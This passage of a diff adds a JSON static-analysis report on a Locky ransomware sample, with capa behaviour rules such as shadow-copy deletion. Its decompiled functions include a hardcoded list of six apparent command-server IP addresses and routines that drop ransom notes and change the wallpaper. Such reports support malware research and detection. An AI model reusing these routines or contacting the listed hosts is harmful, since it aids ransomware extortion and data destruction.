+          "id": "runtime::msvc_sing_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_domain_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6033",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6032",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6031",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6030",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6028",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6027",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6026",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6025",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6024",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6019",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6018",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6017",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6016",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6010",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6009",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6008",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_r6002",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_rl",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_name_unknown",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_runtime_error",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 1
+        },
+        {
+          "id": "runtime::msvc_date",
+          "category": "runtime",
+          "type": "data",
+          "num_hits": 2
+        },
+        {
+          "id": "registry::autorun",
+          "category": "registry",
+          "type": "data",
+          "num_hits": 1
+        }
+      ],
+      "carved": [],
+      "virtual_files": [],
+      "structures": [
+        {
+          "name": "MZ",
+          "ea": 0
+        },
+        {
+          "name": "RichHeader",
+          "ea": 128
+        },
+        {
+          "name": "PE",
+          "ea": 216
+        },
+        {
+          "name": "OptionalHeader",
+          "ea": 240
+        },
+        {
+          "name": "Sections",
+          "ea": 464
+        },
+        {
+          "name": "advapi32.FT",
+          "ea": 66560
+        },
+        {
+          "name": "gdi32.FT",
+          "ea": 66664
+        },
+        {
+          "name": "kernel32.FT",
+          "ea": 66716
+        },
+        {
+          "name": "mpr.FT",
+          "ea": 67084
+        },
+        {
+          "name": "netapi32.FT",
+          "ea": 67104
+        },
+        {
+          "name": "shell32.FT",
+          "ea": 67116
+        },
+        {
+          "name": "user32.FT",
+          "ea": 67128
+        },
+        {
+          "name": "wininet.FT",
+          "ea": 67160
+        },
+        {
+          "name": "ImportTable",
+          "ea": 88356
+        },
+        {
+          "name": "advapi32.OFT",
+          "ea": 88536
+        },
+        {
+          "name": "gdi32.OFT",
+          "ea": 88640
+        },
+        {
+          "name": "kernel32.OFT",
+          "ea": 88692
+        },
+        {
+          "name": "mpr.OFT",
+          "ea": 89060
+        },
+        {
+          "name": "netapi32.OFT",
+          "ea": 89080
+        },
+        {
+          "name": "shell32.OFT",
+          "ea": 89092
+        },
+        {
+          "name": "user32.OFT",
+          "ea": 89104
+        },
+        {
+          "name": "wininet.OFT",
+          "ea": 89136
+        },
+        {
+          "name": "ImportNames",
+          "ea": 89192
+        },
+        {
+          "name": "Relocations",
+          "ea": 103424
+        }
+      ]
+    },
+    "functions": [
+      {
+        "ea": 60365,
+        "name": "sub_40f7cd"
+      },
+      {
+        "ea": 13380,
+        "name": "sub_404044"
+      },
+      {
+        "ea": 12682,
+        "name": "sub_403d8a"
+      },
+      {
+        "ea": 59760,
+        "name": "sub_40f570"
+      },
+      {
+        "ea": 1479,
+        "name": "#3"
+      },
+      {
+        "ea": 25276,
+        "name": "sub_406ebc"
+      },
+      {
+        "ea": 52135,
+        "name": "sub_40d7a7"
+      },
+      {
+        "ea": 51280,
+        "name": "sub_40d450"
+      },
+      {
+        "ea": 2873,
+        "name": "#3"
+      },
+      {
+        "ea": 57392,
+        "name": "sub_40ec30"
+      },
+      {
+        "ea": 64860,
+        "name": "sub_41095c"
+      },
+      {
+        "ea": 4218,
+        "name": "sub_401c7a"
+      },
+      {
+        "ea": 11709,
+        "name": "sub_4039bd"
+      },
+      {
+        "ea": 23628,
+        "name": "sub_40684c"
+      },
+      {
+        "ea": 28502,
+        "name": "sub_407b56"
+      },
+      {
+        "ea": 10432,
+        "name": "sub_4034c0"
+      },
+      {
+        "ea": 29717,
+        "name": "sub_408015"
+      },
+      {
+        "ea": 30161,
+        "name": "sub_4081d1"
+      },
+      {
+        "ea": 28839,
+        "name": "sub_407ca7"
+      },
+      {
+        "ea": 21348,
+        "name": "sub_405f64"
+      },
+      {
+        "ea": 1889,
+        "name": "sub_401361"
+      },
+      {
+        "ea": 9353,
+        "name": "sub_403089"
+      },
+      {
+        "ea": 21910,
+        "name": "sub_406196"
+      },
+      {
+        "ea": 1232,
+        "name": "#2"
+      },
+      {
+        "ea": 26620,
+        "name": "sub_4073fc"
+      },
+      {
+        "ea": 9118,
+        "name": "sub_402f9e"
+      },
+      {
+        "ea": 20702,
+        "name": "sub_405cde"
+      },
+      {
+        "ea": 19811,
+        "name": "sub_405963"
+      },
+      {
+        "ea": 28350,
+        "name": "sub_407abe"
+      },
+      {
+        "ea": 23166,
+        "name": "sub_40667e"
+      }
+    ],
+    "constants": [
+      {
+        "id": "registry::HKEY_CURRENT_USER",
+        "category": "registry",
+        "type": "code",
+        "num_hits": 3
+      },
+      {
+        "id": "exception::C++ exception",
+        "category": "exception",
+        "type": "code",
+        "num_hits": 9
+      },
+      {
+        "id": "exception::FuncInfo header",
+        "category": "exception",
+        "type": "code",
+        "num_hits": 19
+      },
+      {
+        "id": "exception::CLR exception",
+        "category": "exception",
+        "type": "code",
+        "num_hits": 2
+      },
+      {
+        "id": "registry::HKEY_USERS",
+        "category": "registry",
+        "type": "code",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_tloss_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_sing_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_domain_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6033",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6032",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6031",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6030",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6028",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6027",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6026",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6025",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6024",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6019",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6018",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6017",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6016",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6010",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6009",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6008",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_r6002",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_rl",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_name_unknown",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_runtime_error",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 1
+      },
+      {
+        "id": "runtime::msvc_date",
+        "category": "runtime",
+        "type": "data",
+        "num_hits": 2
+      },
+      {
+        "id": "registry::autorun",
+        "category": "registry",
+        "type": "data",
+        "num_hits": 1
+      }
+    ],
+    "anomalies": [
+      {
+        "name": "CryptoApiUsage",
+        "desc": "Crypto-related apis are used",
+        "category": "imports",
+        "level": 2,
+        "num_hits": 24
+      },
+      {
+        "name": "DownloaderApiUsage",
+        "desc": "Downloader-related apis are used",
+        "category": "imports",
+        "level": 2,
+        "num_hits": 2
+      },
+      {
+        "name": "NoChecksum",
+        "desc": "PE Header checksum is not set",
+        "category": "integrity",
+        "level": 1,
+        "num_hits": 1
+      },
+      {
+        "name": "RichMultipleLinkers",
+        "desc": "multiple linker entries in rich header",
+        "category": "rich",
+        "level": 3,
+        "num_hits": 1
+      },
+      {
+        "name": "SpaghettiFunction",
+        "desc": "Function with lots of intra jumps, could be obfuscated",
+        "category": "code",
+        "level": 1,
+        "num_hits": 3
+      },
+      {
+        "name": "StackArrayInitialisationX86",
+        "desc": "An array of data is dynamically built on the stack, sometimes used to build shellcodes or strings",
+        "category": "code",
+        "level": 3,
+        "num_hits": 1
+      },
+      {
+        "name": "XorInLoop",
+        "desc": "XOR instruction in a loop",
+        "category": "code",
+        "level": 3,
+        "num_hits": 15
+      }
+    ],
+    "carved_files": [],
+    "virtual_files": [],
+    "structures": [
+      {
+        "name": "MZ",
+        "ea": 0
+      },
+      {
+        "name": "RichHeader",
+        "ea": 128
+      },
+      {
+        "name": "PE",
+        "ea": 216
+      },
+      {
+        "name": "OptionalHeader",
+        "ea": 240
+      },
+      {
+        "name": "Sections",
+        "ea": 464
+      },
+      {
+        "name": "advapi32.FT",
+        "ea": 66560
+      },
+      {
+        "name": "gdi32.FT",
+        "ea": 66664
+      },
+      {
+        "name": "kernel32.FT",
+        "ea": 66716
+      },
+      {
+        "name": "mpr.FT",
+        "ea": 67084
+      },
+      {
+        "name": "netapi32.FT",
+        "ea": 67104
+      },
+      {
+        "name": "shell32.FT",
+        "ea": 67116
+      },
+      {
+        "name": "user32.FT",
+        "ea": 67128
+      },
+      {
+        "name": "wininet.FT",
+        "ea": 67160
+      },
+      {
+        "name": "ImportTable",
+        "ea": 88356
+      },
+      {
+        "name": "advapi32.OFT",
+        "ea": 88536
+      },
+      {
+        "name": "gdi32.OFT",
+        "ea": 88640
+      },
+      {
+        "name": "kernel32.OFT",
+        "ea": 88692
+      },
+      {
+        "name": "mpr.OFT",
+        "ea": 89060
+      },
+      {
+        "name": "netapi32.OFT",
+        "ea": 89080
+      },
+      {
+        "name": "shell32.OFT",
+        "ea": 89092
+      },
+      {
+        "name": "user32.OFT",
+        "ea": 89104
+      },
+      {
+        "name": "wininet.OFT",
+        "ea": 89136
+      },
+      {
+        "name": "ImportNames",
+        "ea": 89192
+      },
+      {
+        "name": "Relocations",
+        "ea": 103424
+      }
+    ],
+    "decompilations": {
+      "60365": {
+        "name": "sub_40f7cd",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_40f7cd(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    \n    piVar1 = *(unaff_EBP + 8);\n    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x24);\n    __FindAndUnlinkFrame(*(unaff_EBP + -0x28));\n    iVar2 = __getptd();\n    *(iVar2 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar2 = __getptd();\n    *(iVar2 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n        ((iVar2 = piVar1[5], iVar2 == 0x19930520 || ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar2 = __IsExceptionObjectToBeDestroyed(piVar1[6]);\n        if (iVar2 != 0) {\n            sub_40f570(piVar1, *(unaff_EBP + 0x10));\n        }\n    }\n    return;\n}\n"
+      },
+      "13380": {
+        "name": "sub_404044",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_404044(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    undefined4 uVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    int32_t unaff_EBP;\n    undefined4 *puVar10;\n    undefined4 uStack_2fc;\n    undefined4 uStack_2f8;\n    undefined4 uStack_2f4;\n    int32_t iStack_2f0;\n    undefined4 uStack_2ec;\n    int32_t iStack_2e8;\n    int32_t iStack_2e4;\n    undefined *puStack_2e0;\n    code *pcStack_2dc;\n    int32_t iStack_2d8;\n    int32_t iStack_2d4;\n    int32_t iStack_2d0;\n    undefined4 uStack_2cc;\n    undefined4 uStack_2c8;\n    char *pcStack_2c4;\n    char *pcStack_2c0;\n    char *pcStack_2bc;\n    int32_t iStack_2b8;\n    char *pcStack_2b4;\n    char *pcStack_2b0;\n    char *pcStack_2ac;\n    undefined4 uStack_2a8;\n    int32_t iStack_2a4;\n    undefined4 uStack_2a0;\n    undefined4 uStack_29c;\n    undefined4 uStack_298;\n    int32_t iStack_294;\n    code *pcStack_290;\n    undefined4 uStack_28c;\n    \n    __EH_prolog();\n    *(unaff_EBP + -0x10) = &stack0xfffffd78;\n    uStack_28c = 0x8003;\n    pcStack_290 = 0x404065;\n    (*kernel32.SetErrorMode)();\n    pcStack_290 = sub_403066;\n    iStack_294 = 0x404070;\n    (*kernel32.SetUnhandledExceptionFilter)();\n    iStack_294 = unaff_EBP + -0x28;\n    pcVar9 = 0x0;\n    uStack_298 = 0x80;\n    *(unaff_EBP + -0x54) = 0;\n    uStack_29c = 0x404084;\n    uStack_29c = (*kernel32.GetCurrentProcess)();\n    uStack_2a0 = 0x40408b;\n    iVar3 = (*advapi32.OpenProcessToken)();\n    if (iVar3 != 0) {\n        uStack_2a0 = 4;\n        iStack_2a4 = unaff_EBP + -0x54;\n        uStack_2a8 = 0x18;\n        pcStack_2ac = *(unaff_EBP + -0x28);\n        pcStack_2b0 = 0x4040a0;\n        (*advapi32.SetTokenInformation)();\n        pcStack_2b0 = *(unaff_EBP + -0x28);\n        pcStack_2b4 = 0x4040a9;\n        (*kernel32.CloseHandle)();\n    }\n    uStack_2a0 = \"Wow64DisableWow64FsRedirection\";\n    iStack_2a4 = \"kernel32.dll\";\n    uStack_2a8 = 0x4040b9;\n    uStack_2a8 = (*kernel32.GetModuleHandleA)();\n    pcStack_2ac = 0x4040c0;\n    pcVar4 = (*kernel32.GetProcAddress)();\n    if (pcVar4 != 0x0) {\n        pcStack_2ac = unaff_EBP + -0x30;\n        pcStack_2b0 = 0x4040ca;\n        (*pcVar4)();\n    }\n    *(unaff_EBP + -4) = 0;\n    if ([\"91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116\"] != '\\0') {\n        *(unaff_EBP + -0x38) = 0xf;\n        *(unaff_EBP + -0x3c) = 0;\n        *(unaff_EBP + -0x4c) = 0;\n        pcVar6 = \"91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116\";\n        do {\n            pcVar5 = pcVar6;\n            pcVar6 = pcVar5 + 1;\n        } while (*pcVar5 != '\\0');\n        pcVar5 = pcVar5 + -0x4137ef;\n        pcStack_2ac = \"91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116\";\n        pcStack_2b0 = 0x404106;\n        cVar1 = sub_405579();\n        iStack_2b8 = unaff_EBP + -0x4c;\n        if (cVar1 == '\\0') {\n            pcStack_2b0 = 0x0;\n            iStack_2b8 = 0x404120;\n            pcStack_2b4 = pcVar5;\n            cVar1 = sub_4057d7();\n            if (cVar1 != '\\0') {\n                pcStack_2c4 = *(unaff_EBP + -0x4c);\n                if (*(unaff_EBP + -0x38) < 0x10) {\n                    pcStack_2c4 = unaff_EBP + -0x4c;\n                }\n                pcStack_2c0 = \"91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116\"\n                ;\n                uStack_2c8 = 0x404138;\n                pcStack_2bc = pcVar5;\n                sub_40e7d0();\n                iVar3 = *(unaff_EBP + -0x4c);\n                *(unaff_EBP + -0x3c) = pcVar5;\n                if (*(unaff_EBP + -0x38) < 0x10) {\n                    iVar3 = unaff_EBP + -0x4c;\n                }\n                pcVar5[iVar3] = '\\0';\n            }\n        }\n        else {\n            pcStack_2b4 = \"91.195.12.187,195.64.154.114,149.202.109.205,51.254.181.122,78.40.108.39,188.127.231.116\" - iStack_2b8;\n          "
+      },
+      "12682": {
+        "name": "sub_403d8a",
+        "decompilation": "\n/* DISPLAY WARNING: Type casts are NOT being printed */\n\nvoid sub_403d8a(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    undefined4 uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    undefined *puVar5;\n    undefined4 *unaff_FS_OFFSET;\n    \n    __EH_prolog();\n    sub_4052d4(unaff_EBP + -0x88);\n    *(unaff_EBP + -4) = 0;\n    sub_404b68(unaff_EBP + -0x6c, unaff_EBP + -0x88, \"\\\\_Locky_recover_instructions.txt\");\n    *(unaff_EBP + -4) = 1;\n    sub_404b68(unaff_EBP + -0x48, unaff_EBP + -0x88, \"\\\\_Locky_recover_instructions.bmp\");\n    *(unaff_EBP + -4) = 2;\n    cVar2 = sub_405cde();\n    if (cVar2 == '\\0') {\n        iVar4 = *(unaff_EBP + -0x6c);\n        if (*(unaff_EBP + -0x58) < 8) {\n            iVar4 = unaff_EBP + -0x6c;\n        }\n        sub_405d28(iVar4);\n    }\n    cVar2 = sub_405cde();\n    if (cVar2 == '\\0') {\n        uVar3 = sub_405c7b(unaff_EBP + -0xa4);\n        *(unaff_EBP + -4) = 3;\n        sub_4039bd(unaff_EBP + -0x28, uVar3);\n        *(unaff_EBP + -4) = 5;\n        sub_402d33(1);\n        iVar4 = *(unaff_EBP + -0x48);\n        if (*(unaff_EBP + -0x34) < 8) {\n            iVar4 = unaff_EBP + -0x48;\n        }\n        sub_405d28(iVar4);\n        *(unaff_EBP + -4) = 2;\n        sub_4059f4(1);\n    }\n    iVar4 = (*advapi32.RegOpenKeyExA)(0x80000001, \"Control Panel\\\\Desktop\", 0, 0x2001f, unaff_EBP + -0x2c);\n    if (iVar4 != 0) {\n        *(unaff_EBP + -0x4c) = iVar4;\n        *(unaff_EBP + -0x50) = &livsx.Vtable;\n        __CxxThrowException@8(unaff_EBP + -0x50, 0x414fbc);\n    }\n    *(unaff_EBP + -4) = 6;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x28) = 0;\n    cVar2 = sub_405579(0x413b6c);\n    if (cVar2 == '\\0') {\n        cVar2 = sub_4057d7(1, 0);\n        if (cVar2 != '\\0') {\n            puVar5 = *(unaff_EBP + -0x28);\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                puVar5 = unaff_EBP + -0x28;\n            }\n            *puVar5 = [0x0x413b6c];\n            iVar4 = *(unaff_EBP + -0x28);\n            *(unaff_EBP + -0x18) = 1;\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                iVar4 = unaff_EBP + -0x28;\n            }\n            *(iVar4 + 1) = 0;\n        }\n    }\n    else {\n        sub_405625(unaff_EBP + -0x28, 0x413b6c - (unaff_EBP + -0x28), 1);\n    }\n    *(unaff_EBP + -4) = 7;\n    sub_404ce7(unaff_EBP + -0x2c, unaff_EBP + -0x28);\n    *(unaff_EBP + -4) = 6;\n    sub_4059f4(1);\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 0xf;\n    *(unaff_EBP + -0x28) = 0;\n    cVar2 = sub_405579(0x413b6c);\n    if (cVar2 == '\\0') {\n        cVar2 = sub_4057d7(1, 0);\n        if (cVar2 != '\\0') {\n            puVar5 = *(unaff_EBP + -0x28);\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                puVar5 = unaff_EBP + -0x28;\n            }\n            *puVar5 = [0x0x413b6c];\n            iVar4 = *(unaff_EBP + -0x28);\n            *(unaff_EBP + -0x18) = 1;\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                iVar4 = unaff_EBP + -0x28;\n            }\n            *(iVar4 + 1) = 0;\n        }\n    }\n    else {\n        sub_405625(unaff_EBP + -0x28, 0x413b6c - (unaff_EBP + -0x28), 1);\n    }\n    *(unaff_EBP + -4) = 8;\n    sub_404ce7(unaff_EBP + -0x2c, unaff_EBP + -0x28);\n    sub_4059f4(1);\n    iVar4 = *(unaff_EBP + -0x48);\n    if (*(unaff_EBP + -0x34) < 8) {\n        iVar4 = unaff_EBP + -0x48;\n    }\n    (*user32.SystemParametersInfoW)(0x14, 0, iVar4, 3);\n    pcVar1 = shell32.ShellExecuteW;\n    iVar4 = *(unaff_EBP + -0x6c);\n    if (*(unaff_EBP + -0x58) < 8) {\n        iVar4 = unaff_EBP + -0x6c;\n    }\n    (*shell32.ShellExecuteW)(0, \"open\", iVar4, 0, 0, 1);\n    iVar4 = *(unaff_EBP + -0x48);\n    if (*(unaff_EBP + -0x34) < 8) {\n        iVar4 = unaff_EBP + -0x48;\n    }\n    (*pcVar1)(0, \"open\", iVar4, 0, 0, 1);\n    if (*(unaff_EBP + -0x2c) != 0) {\n        (*advapi32.RegCloseKey)(*(unaff_EBP + -0x2c));\n    }\n    sub_402d33(1);\n    sub_402d33(1);\n    sub_402d33(1);\n    *unaff_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n"
+      }
+    },
+    "script_decompile": null,
+    "unpack_result": null,
+    "errors": [],
+    "entropy_bits": 6.13,
+    "entropy_malcat_raw": 116
+  },
+  "capa": {
+    "rule_count": 50,
+    "top_rules": [
+      {
+        "name": "encode data using XOR",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Obfuscated Files or Information",
+            "subtechnique": "",
+            "id": "T1027"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information",
+              "Encoding-Standard Algorithm"
+            ],
+            "objective": "Defense Evasion",
+            "behavior": "Obfuscated Files or Information",
+            "method": "Encoding-Standard Algorithm",
+            "id": "E1027.m02"
+          },
+          {
+            "parts": [
+              "Data",
+              "Encode Data",
+              "XOR"
+            ],
+            "objective": "Data",
+            "behavior": "Encode Data",
+            "method": "XOR",
+            "id": "C0026.002"
+          }
+        ]
+      },
+      {
+        "name": "encrypt or decrypt via WinCrypt",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Obfuscated Files or Information",
+            "subtechnique": "",
+            "id": "T1027"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Cryptography",
+              "Decrypt Data"
+            ],
+            "objective": "Cryptography",
+            "behavior": "Decrypt Data",
+            "method": "",
+            "id": "C0031"
+          },
+          {
+            "parts": [
+              "Cryptography",
+              "Encrypt Data"
+            ],
+            "objective": "Cryptography",
+            "behavior": "Encrypt Data",
+            "method": "",
+            "id": "C0027"
+          }
+        ]
+      },
+      {
+        "name": "encrypt data using AES via x86 extensions",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Obfuscated Files or Information",
+            "subtechnique": "",
+            "id": "T1027"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information",
+              "Encryption-Standard Algorithm"
+            ],
+            "objective": "Defense Evasion",
+            "behavior": "Obfuscated Files or Information",
+            "method": "Encryption-Standard Algorithm",
+            "id": "E1027.m05"
+          },
+          {
+            "parts": [
+              "Cryptography",
+              "Encrypt Data",
+              "AES"
+            ],
+            "objective": "Cryptography",
+            "behavior": "Encrypt Data",
+            "method": "AES",
+            "id": "C0027.001"
+          }
+        ]
+      },
+      {
+        "name": "delete volume shadow copies",
+        "attack": [
+          {
+            "parts": [
+              "Impact",
+              "Inhibit System Recovery"
+            ],
+            "tactic": "Impact",
+            "technique": "Inhibit System Recovery",
+            "subtechnique": "",
+            "id": "T1490"
+          },
+          {
+            "parts": [
+              "Defense Evasion",
+              "Indicator Removal",
+              "File Deletion"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Indicator Removal",
+            "subtechnique": "File Deletion",
+            "id": "T1070.004"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Impact",
+              "Data Destruction",
+              "Delete Shadow Copies"
+            ],
+            "objective": "Impact",
+            "behavior": "Data Destruction",
+            "method": "Delete Shadow Copies",
+            "id": "E1485.m04"
+          }
+        ]
+      },
+      {
+        "name": "create new key via CryptAcquireContext",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Obfuscated Files or Information",
+            "subtechnique": "",
+            "id": "T1027"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Cryptography",
+              "Encryption Key"
+            ],
+            "objective": "Cryptography",
+            "behavior": "Encryption Key",
+            "method": "",
+            "id": "C0028"
+          }
+        ]
+      },
+      {
+        "name": "get common file path",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "File and Directory Discovery",
+            "subtechnique": "",
+            "id": "T1083"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "File and Directory Discovery",
+            "method": "",
+            "id": "E1083"
+          }
+        ]
+      },
+      {
+        "name": "enumerate files on Windows",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "File and Directory Discovery",
+            "subtechnique": "",
+            "id": "T1083"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "File and Directory Discovery",
+            "method": "",
+            "id": "E1083"
+          }
+        ]
+      },
+      {
+        "name": "enumerate files recursively",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "File and Directory Discovery",
+            "subtechnique": "",
+            "id": "T1083"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "File and Directory Discovery",
+            "method": "",
+            "id": "E1083"
+          }
+        ]
+      },
+      {
+        "name": "get file size",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "File and Directory Discovery",
+            "subtechnique": "",
+            "id": "T1083"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "File and Directory Discovery",
+            "method": "",
+            "id": "E1083"
+          }
+        ]
+      },
+      {
+        "name": "set file attributes",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "File and Directory Permissions Modification"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "File and Directory Permissions Modification",
+            "subtechnique": "",
+            "id": "T1222"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "File System",
+              "Set File Attributes"
+            ],
+            "objective": "File System",
+            "behavior": "Set File Attributes",
+            "method": "",
+            "id": "C0050"
+          }
+        ]
+      },
+      {
+        "name": "get disk information",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "System Information Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "System Information Discovery",
+            "subtechnique": "",
+            "id": "T1082"
+          }
+        ],
+        "mbc": [
